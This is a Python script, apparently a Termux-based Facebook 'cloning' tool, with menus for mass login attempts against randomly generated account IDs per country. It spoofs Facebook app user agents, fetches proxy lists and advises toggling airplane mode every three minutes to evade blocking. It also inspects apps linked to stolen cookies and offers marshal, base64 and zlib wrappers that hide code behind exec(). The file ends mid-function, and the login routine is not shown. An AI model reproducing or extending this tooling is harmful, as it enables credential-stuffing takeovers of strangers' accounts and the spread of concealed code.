#───────────────[ IMPORT SYSTEM ]─────────────────────────#
import requests,bs4,json,os,sys,random,datetime,time,re
import os,random
import sys,time,uuid
import rich,json,subprocess,random,string
import urllib3,rich,base64
from os import system as c
import marshal
import base64
import zlib
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import marshal, base64, zlib
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
        import os,sys,tempfile,string,random,subprocess,uuid
        from time import localtime as lt
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform,httpx
        from string import *
        from concurrent.futures import ThreadPoolExecutor as Ghost
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
pretty.install()
CON=sol()
#__________________| IMPORT |__________________#
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
def clear():
        os.system('clear')
print(f'\033[1;91m[\033[1;92m●\033[1;91m]\x1b[38;5;46m WELCOME TO NOBITA TOOL')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python NOBITA.py')
except:pass
#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';M1 = '\033[1;31m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________________| UA |__________________#
def ua():
	vivo = random.choice(["U3", "1002T", "C", "1605", "730", "A5", "A54", "a57", "A87",
    "C8818", "EGO", "E1", "E3", "E5", "X21", "X21i", "X2s", "X23",
    "iQOO", "X5Max5", "X5V", "X60t", "X6S", "X7", "X70", "Xplay", "Xshot",
    "Y01", "Y01A", "Y02", "Y02s", "V1", "V11", "V11s", "Y13T", "Nex",
    "S1", "S10", "S11", "S11t", "S12", "S13", "S15", "S15e", "S1PRO",
    "S20", "S21", "S31", "S5", "S6", "S6T", "S7", "S76", "S7e",
    "S7t", "S7w", "S9", "S9e", "T1", "T1x", "T2", "T2x", "E1",
    "U10", "U20", "X20", "X1w", "23x", "V77e", "Y613F", "Y628", "X3S",
    "Z1", "Z10", "Z1i", "Z1LITE", "Z1PRO", "Z1x", "Z34"])
	ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/'+str(vivo)+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
	return ua
#───────────────[ GHOST END ]─────────────────────────#
#───────────────[ USER AGENT ]─────────────────────────#
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
 
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

    
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
#───────────────[ INDICATION ]─────────────────────────#
id,id2,loop,oki,cpi,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#───────────────[ COLOR-LIST]─────────────────────────#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###───────────────[ ANSII COLOR STYLE]─────────────────────────###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###───────────────[ RICH COLOR STYLE ]─────────────────────────###
 
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

#───────────────[ CONVERTER-BULAN ]─────────────────────────#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"


#old ua def[👇]
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])

#───────────────[ APPLICATION CHECKER ]───────────────#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s{P}[%s×%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'[🔥] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'[✔] %s ☑ Your Expired Apps ☑    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print("%s═════════════════════%s═════════════════════%s"%(M,H,P))

#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
logo =""" 
\x1b[38;5;82m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;82m┃    _   ______  ____  _____________    ┃NAME=SAMARPAN JABEU       ┃
\x1b[38;5;82m┃   / | / / __ \/ __ )/  _/_  __/   |   ┃FACEBOOK=SAMARPANJABEGU   ┃
\x1b[38;5;82m┃  /  |/ / / / / __  |/ /  / / / /| |   ┃VERSION=1.3               ┃
\x1b[38;5;82m┃ / /|  / /_/ / /_/ // /  / / / ___ |   ┃WHATSAPP=+9779816029717   ┃
\x1b[38;5;82m┃/_/ |_/\____/_____/___/ /_/ /_/  |_|   ┃GITHUB=MR×SPJL            ┃
\x1b[38;5;82m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝"""
os.system('clear')
print(logo)
uname =input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m YOUR NAME \033[1;91m: \033[1;35m')
def back():
	login()
#_________[ LOGIN KEY ]______>>
CorrectUsername = 'F'
key = 'true'
while key == 'true':
    username = input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[0;97m[•]\033[1;32m LOGGED IN PAID TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
#───────────────SECURITY_1-END───────────────#

#───────────────[ MAIN MENU ]───────────────#

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;37m+\033[1;31m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f"""\033[1;31m[\033[1;37m1\033[1;31m] \033[0;95mFILE CLONING         """)
    print(f"""\033[1;31m[\033[1;37m2\033[1;31m] \033[1;32mRANDOM CLONING         """)
    print(f"""\033[1;31m[\033[1;37m3\033[1;31m] \033[1;32m2009-2015 CLONING         """)
    print(f"""\033[1;31m[\033[1;37m4\033[1;31m] \x1b[38;5;205mSCRIPT ENCODE         """)
    print(f"""\033[1;31m[\033[1;37m5\033[1;31m] \033[38;5;208mFILE MAKE TOOL         """)
    print(f"""\033[1;31m[\033[1;37m6\033[1;31m] \033[0;94mOWNER""")
    print("""\033[1;31m[\033[1;37m0\033[1;31m] \033[0;91mEXIT""")
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    LADO = input('\033[1;31m[\033[1;37m?\033[1;31m] \033[1;32mCHOOSE\033[1;37m :\033[0;95m ')
    clear()
    print(logo)
    if LADO in ['1']:
        crack_file()
    elif LADO in ['2','02']:
    	randm()
    elif LADO in ['3','03']:
        _old_()
    elif LADO in ['4','04']:
        enc()
    elif LADO in ['5','05']:
        dump()
    elif LADO in ['6','06']:
        os.system('xdg-open https://m.facebook.com/DBZ280')
        os.system("python nono.py")
    elif LADO in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
#───────────────[ RANDOM - MENU]───────────────# 
def randm():
    os.system('clear')
    print(logo)
    print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;32mBANGLADESH CLONING ')
    print(f'\033[1;31m[\033[1;37m2\033[1;31m] \033[1;32mINDIA CLONING ')
    print(f'\033[1;31m[\033[1;37m3\033[1;31m] \033[1;32mNEPAL CLONING ')
    print(f'\033[1;31m[\033[1;37m4\033[1;31m] \033[1;32mPAKISTAN CLONING ')
    print(f'\033[1;31m[\033[1;37m5\033[1;31m] \033[1;32mAFGHANISTAN CLONING ')
    print(f'\033[1;31m[\033[1;37m0\033[1;31m] \033[1;32mBACK TO MENU ')
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    option=input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
    elif option in ['3','C']:
    	nepal()
    elif option in ['4','D']:
    	pakistan()
    elif option in ['5','E']:
    	afghanistan()
    elif option in ['0','00']:
    	menu()
    else:
        exit(f'{B}❲{A}={B}❳{G} VAK MUGI ')

def dump():
	os.system("clear");print(logo)
	print('\033[1;32m[\033[37;1m01\033[1;32m]\033[1;32m CREATE FILE ')
	print('\033[1;32m[02]\033[37;1m CREATE FILE UNLIMITED ')
	print('\033[1;32m[\033[37;1m03\033[1;32m]\033[1;32m CREATE NEW IDz FILE  ')
	print('\033[1;32m[04]\033[1;94m REMOVE DUPLICATE IDz ')
	print('\033[1;32m[05]\033[37;1m REMOVE COOKIE ')
	print('\033[1;32m[\033[37;1m00\033[1;32m]\033[1;31m EXIT TOOL  ')
	print(f'\r\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	menu = input('\033[1;32m Choose Option : ')
	if menu in ['01','1']:
		file_create_menu().file_simple()
	if menu in ['02','2']:
		file_create_menu().file_unlimmited()
	if menu in ['03','3']:
		file_create_menu().new_ids()
	if menu in ['04','4']:
		duplicate()
	if menu in ['05','5']:
		cookie_remover()
	if menu in ['00','0']:
		exit('VAK MUGI !')
	else:
		exit(' invalid ')

#───────────────[ OLD - MENU ]───────────────# 
def _old_():
       user=[]
       print(f'\033[1;31m[\033[1;37m☂\033[1;31m] \033[1;37mEXAMPLE    \033[1;33m : \033[1;37m3000/5000/10000/99999')
       print(f'\r\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
       limit=input(f"\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m INPUT \033[1;31m\033[1;37m: ")
       os.system('clear')
       print(logo)
       print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mMETHOD (BEST-1) ')
       print(f'\r\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#       line()
       ask=input(f"\033[1;31m[\033[1;37m?\033[1;31m] INPUT : ")
       if ask in["1"]:
          star="10000"
          for i in range(int(limit)):
              data=str(random.choice(range(1000000000,9999999999)))
              user.append(data)
       else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
       with Ghost(max_workers=40) as skber:
#           fresh()
           os.system('clear')
           print(logo)
           print(f'\x1b[38;5;196m[\x1b[38;5;46m☂\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46m METHOD : M\x1b[38;5;46m{ask}')
           print(f'\x1b[38;5;196m[\x1b[38;5;46m☂\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
           print(f'\r\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
           for mal in user:
              uid=star+mal
              skber.submit(login,uid)
    
loop=0
oks=[]
cps=[]
#───────────────[ SCRIPT - ENCODE]───────────────# 
def enc():
    clear()
    print(logo)
    print('\033[1;31m[\033[1;37m1\033[1;31m]\033[1;32m ENCODE MARSHAL ')
    print('\033[1;31m[\033[1;37m2\033[1;31m]\033[1;32m ENCODE BASE64  ')
    print('\033[1;31m[\033[1;37m3\033[1;31m]\033[1;32m ENCODE ZLIB    ')
    print('\033[1;31m[\033[1;37m0\033[1;31m]\033[1;32m EXIT ')
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    option=input('\033[1;93m [?] CHOICE MENU : ')
    if option in ['a','1']:
        marshal_enc()
    elif option in ['b','2']:
        base64_enc()
    elif option in ['c','3']:
        zlib_enc()
    else:
        exit(' VAK MUGI :/')
#───────────────[ MARSHAL - ENCRYPTION ]───────────────#
def marshal_enc():
    clear()
    print(logo)
    file=input('\033[1;37mENTER SOURCE FILE NAME : ')
    filex=input('\033[1;37mENTER OUTPUT FILE NAME : ')
    try:
        file_open=open(file,'r').read()
    except:
        exit(' FILE NOT FOUND ERROR !!')
    compilex=compile(file_open,'dg','exec')
    dump=marshal.dumps(compilex)
    run_code=f'import marshal \nexec(marshal.loads({dump}))'
    out_put=open(filex,'w')
    out_put.write('#-------------------------------------##-------------------------------------#\n# ENCRYPTED BY : GHOST KING\n# GITHUB : https://github.com/Ghost3987\n#-------------------------------------##-------------------------------------#\n\n')
    out_put.write(run_code)
    out_put.close()
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' [✓✓] ENCRYPTION COMPLETE :/ ')
    print(' [✓✓] OUTPUT FILE SAVE AS : '+filex)
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#───────────────[ BASE64 - ENCRYPTION ]───────────────#
def base64_enc():
    clear()
    print(logo)
    input_file=input('\033[1;37mENTER SOURCE FILE PATH : ')
    output_file=input('\033[1;37mENTER OUTPUT FILE PATH : ')
    try:
        file_open=open(input_file,'r').read()
    except:
        exit(' FILE NOT FOUND ERROR !!')
    compile=base64.b64encode(file_open.encode())
    run_code=f'import base64\nexec(base64.b64decode({compile}))'
    out_put=open(output_file,'w')
    out_put.write('#-------------------------------------##-------------------------------------#\n# ENCRYPTED BY : GHOST KING\n# GITHUB : https://github.com/Ghost3987\n#-------------------------------------##-------------------------------------#\n\n')
    out_put.write(run_code)
    out_put.close()
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' [✓✓] ENCRYPTION COMPLETE :/')
    print(' [✓✓] ENC FILE SAVE AS : '+output_file)
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#───────────────[ ZLIB - ENCRYPTION ]───────────────#
def zlib_enc():
    clear()
    print(logo)
    src=input('\033[1;37mENTER SOURCE FILE PATH : ')
    save_file=input('\033[1;37mENTER OUTPUT FILE PATH : ')
    try:
        src_file=open(src,'r').read()
    except:
        exit(' FILE NOT FOUND !!')
    compile_zlib=zlib.compress(src_file.encode())
    run_code=f'import zlib\nexec(zlib.decompress({compile_zlib}).decode())'
    out_put=open(save_file,'w')
    out_put.write('#-------------------------------------##-------------------------------------#\n# ENCRYPTED BY : GHOST KING\n# GITHUB : https://github.com/Ghost3987\n#-------------------------------------##-------------------------------------#\n\n')
    out_put.write(run_code)
    out_put.close()
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' [✓✓] ENCRYPTION COMPLETE :/')
    print(' [✓✓] ENC FILE SAVE AS : '+save_file)
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#───────────────[ ENCRYPTION - END ]───────────────#
#__________________| BANGLADESH |__________________#
def bd():
		user=[]
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 017 | 019 | 018 | 016 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		code = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		clear()
		os.system('clear')
		print(logo)
